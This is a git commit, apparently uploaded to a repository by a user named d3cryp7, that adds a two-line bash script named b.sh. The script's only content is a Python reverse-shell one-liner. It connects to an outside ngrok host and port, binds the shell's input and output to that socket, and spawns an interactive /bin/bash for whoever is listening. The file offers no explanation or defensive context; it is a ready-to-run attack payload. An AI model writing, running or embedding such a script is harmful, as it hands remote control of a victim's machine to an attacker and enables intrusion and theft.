d10b63ba8b5deb602607d38da31d609b78b9c87e
d3cryp7 <70047524+d3cryp7@users.noreply.github.com>
2020-11-13 11:53:31 -0500

    Add files via upload

---
+++ b.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",14633));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
